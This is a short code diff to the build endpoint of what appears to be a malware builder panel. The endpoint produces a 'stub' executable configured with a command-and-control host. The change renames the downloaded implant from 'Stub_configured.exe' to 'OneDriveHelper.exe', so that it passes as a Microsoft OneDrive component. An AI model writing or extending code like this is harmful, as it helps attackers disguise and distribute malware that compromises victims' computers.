@@ -10,7 +10,7 @@ router.post("/api/build", requireAdmin, (req, res) => {
   try {
     const out = buildStubBinary(req.body);
     res.setHeader("Content-Type", "application/octet-stream");
-    res.setHeader("Content-Disposition", 'attachment; filename="Stub_configured.exe"');
+    res.setHeader("Content-Disposition", 'attachment; filename="OneDriveHelper.exe"');
     res.send(out);
     console.log(`[builder] built stub  host=${req.body.c2Host}  size=${out.length}`);
   } catch (e) {
